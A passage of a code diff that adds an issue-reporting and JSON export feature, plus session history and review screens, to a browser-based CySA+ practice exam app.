+      whenLocal: new Date().toLocaleString('en-US',{timeZone:'America/New_York'})+' ET',
+      reason: reasonEl.value,
+      suggested,
+      note: ($('#issueNote')&&$('#issueNote').value||'').trim(),
+      snapshot: questionSnapshot(q)
+    });
+    saveReports(reports);
+    closeSheet();
+  };
+}
+const REASON_LABELS={wrong_key:'Wrong answer key',bad_explanation:'Bad explanation',unclear:'Unclear question',other:'Other'};
+function formatSuggested(rep){
+  const s=rep.suggested, snap=rep.snapshot||{};
+  if (s==null || s==='') return '';
+  if (Array.isArray(s) && snap.options) return letters(s, snap.options);
+  return String(s);
+}
+async function exportReportsFile(){
+  const day=new Date().toLocaleDateString('en-CA',{timeZone:'America/New_York'});
+  const name=`cysa_reports_${day}.json`;
+  const data=JSON.stringify(reports,null,2);
+  try{
+    if (typeof File==='function'){
+      const file=new File([data], name, {type:'application/json'});
+      if (navigator.share && navigator.canShare && navigator.canShare({files:[file]})){
+        await navigator.share({files:[file], title:'CySA+ reported issues', text:name});
+        return;
+      }
+    }
+  }catch(e){ if (e && e.name==='AbortError') return; }
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([data],{type:'application/json'}));
+  a.download=name; a.click();
+  setTimeout(()=>URL.revokeObjectURL(a.href), 2000);
+}
+function renderReports(){
+  const view=beginAuxView('Reports');
+  view.appendChild(el(`<div class="card">
+    <h2 style="margin-top:0">Reported issues</h2>
+    <p class="muted">Flag questions as you study, then export one file to send for fixes. This is separate from "Flag for review" during an exam.</p>
+    <div class="toolbar">
+      <button class="btn" id="repBack">Back</button>
+      <button class="btn" id="repExport" ${reports.length?'':'disabled'}>Export JSON</button>
+      <button class="btn danger" id="repClear" ${reports.length?'':'disabled'}>Clear all</button>
+    </div>
+  </div>`));
+  $('#repBack').onclick=backFromAux;
+  $('#repExport').onclick=()=>exportReportsFile();
+  $('#repClear').onclick=()=>{
+    if (!reports.length) return;
+    if (!confirm('Clear all reported issues?')) return;
+    reports=[]; saveReports(reports); renderReports();
+  };
+  if (!reports.length){
+    view.appendChild(el(`<div class="card"><p class="muted" style="margin:0">No reported issues yet. Open any question and tap Report issue.</p></div>`));
+    return;
+  }
+  const list=el(`<div class="card"><div class="report-list" id="reportList"></div></div>`);
+  const host=list.querySelector('#reportList');
+  reports.slice().reverse().forEach(rep=>{
+    const sug=formatSuggested(rep);
+    const card=el(`<div class="report-card">
+      <div><span class="tag">${esc(rep.questionId||'')}</span> <span class="tag">${esc(REASON_LABELS[rep.reason]||rep.reason||'')}</span></div>
+      <p style="margin:8px 0 4px;overflow-wrap:anywhere">${esc((rep.snapshot&&rep.snapshot.stem)||'')}</p>
+      ${sug?`<p class="muted ansline" style="margin:0 0 4px">I think the answer is: ${esc(sug)}</p>`:''}
+      ${rep.note?`<p style="margin:0 0 4px;white-space:pre-wrap">${esc(rep.note)}</p>`:''}
+      <p class="footerhint" style="margin:0 0 8px">${esc(rep.whenLocal||rep.when||'')}</p>
+      <button type="button" class="btn">Delete</button>
+    </div>`);
+    card.querySelector('button').onclick=()=>{
+      reports=reports.filter(r=>r.id!==rep.id);
+      saveReports(reports);
+      renderReports();
+    };
+    host.appendChild(card);
+  });
+  view.appendChild(list);
+}
+function renderHistoryList(){
+  const view=beginAuxView('History');
+  view.appendChild(el(`<div class="card">
+    <h2 style="margin-top:0">All sessions</h2>
+    <div class="toolbar"><button class="btn" id="histBack">Back</button></div>
+    ${store.history.length?'<div class="hist-list" id="histAll"></div>':'<p class="muted">No attempts yet.</p>'}
+  </div>`));
+  $('#histBack').onclick=backFromAux;
+  const host=$('#histAll');
+  if (!host) return;
+  store.history.slice().reverse().forEach(h=>{
+    host.appendChild(histCard(h, store.history.indexOf(h)));
+  });
+}
+function renderHistoryDetail(idx){
+  const h=store.history[idx];
+  if (!h){ renderHistoryList(); return; }
+  const view=beginAuxView('Session');
+  const missedN=Array.isArray(h.items)?h.items.filter(it=>!it.correct).length:null;
+  view.appendChild(el(`<div class="card">
+    <h2 style="margin-top:0">Session review</h2>
+    <div class="scorebig ${h.pass?'pass':'fail'}">${h.scaled}</div>
+    <p class="${h.pass?'pass':'fail'}" style="font-size:20px;font-weight:700;margin:4px 0">${h.pass?'PASS':'FAIL'} <span class="muted">(${esc(h.mode)} · ${h.count||'?'} questions)</span></p>
+    <div class="kpis">
+      <div class="kpi"><b>${h.pct!=null?h.pct+'%':'n/a'}</b><span class="muted">Raw accuracy</span></div>
+      <div class="kpi"><b>${fmtTime(h.elapsed||0)}</b><span class="muted">Time used</span></div>
+      <div class="kpi"><b>${missedN==null?'n/a':missedN}</b><span class="muted">Missed</span></div>
+      <div class="kpi"><b>${esc(h.whenLocal||'')}</b><span class="muted">When</span></div>
+    </div>
+    <div class="toolbar" style="margin-top:12px"><button class="btn" id="sessBack">Back</button></div>
+  </div>`));
+  $('#sessBack').onclick=()=>renderHistoryList();
+  if (!Array.isArray(h.items) || !h.items.length){
+    view.appendChild(el(`<div class="card"><p class="muted" style="margin:0">Question details weren't recorded for this session. New attempts will save each question, your answer, and whether it was correct.</p></div>`));
+    return;
+  }
+  const list=el(`<div class="card">
+    <h3 style="margin-top:0">Questions</h3>
+    <div class="filterbar">
+      <button type="button" class="btn active" data-f="missed">Missed</button>
+      <button type="button" class="btn" data-f="all">All</button>
+    </div>
+    <div id="sessionQs"></div>
+  </div>`);
+  function paint(filter){
+    const host=list.querySelector('#sessionQs');
+    host.innerHTML='';
+    const rows=h.items.map((it,i)=>({it,i})).filter(x=>filter==='all'||!x.it.correct);
+    if (!rows.length){
+      host.appendChild(el(`<p class="muted">${filter==='missed'?"You didn't miss any questions in this session.":'No questions in this session.'}</p>`));
+      return;
+    }
+    rows.forEach(({it,i})=>{
+      const q=it.q||{};
+      const r={correct:!!it.correct, earned:it.earned, possible:it.possible};
+      const wrap=el(`<div class="session-q">
+        <div><b>Q${i+1}.</b> <span class="tag">${esc(it.id||q.id||'')}</span> <span class="tag">${esc(q.type||'')}</span>
+          <span class="tag ${it.correct?'pass':'fail'}">${it.correct?'Correct':'Missed'}</span>
+          <span class="tag">${it.earned}/${it.possible} pts</span></div>
+        <div class="stem" style="font-size:15px;margin:8px 0">${esc(q.question||q.title||'')}</div>
+        <div class="ansline"><b>Your answer:</b> ${esc(formatUser({q,user:it.user}))}</div>
+        <div class="ansline"><b>Correct answer:</b> ${esc(formatAnswer(q))}</div>
+      </div>`);
+      wrap.appendChild(reportButton(q));
+      const tog=el(`<button type="button" class="btn explainer-toggle">Show explanation</button>`);
+      const box=el(`<div class="hidden explainer-slot"></div>`);
+      box.innerHTML=formatExplainerHtml(q, it.user, r);
+      tog.onclick=()=>{
+        const on=box.classList.toggle('hidden');
+        tog.textContent = on ? 'Show explanation' : 'Hide explanation';
+      };
+      wrap.append(tog, box);
+      host.appendChild(wrap);
+    });
+  }
+  list.querySelectorAll('.filterbar .btn').forEach(b=>{
+    b.onclick=()=>{
+      list.querySelectorAll('.filterbar .btn').forEach(x=>x.classList.remove('active'));
+      b.classList.add('active');
+      paint(b.getAttribute('data-f'));
+    };
+  });
+  view.appendChild(list);
+  paint('missed');
+}
+
 document.addEventListener('keydown', (e)=>{
+  if (e.key==='Escape' && $('#issueSheet')){ closeSheet(); return; }
   if (!state || !state.items) return;
   if (['INPUT','SELECT','TEXTAREA'].includes(e.target.tagName)) return;
   if (e.key==='ArrowRight'){ state.idx=Math.min(state.items.length-1,state.idx+1); renderExam(); }
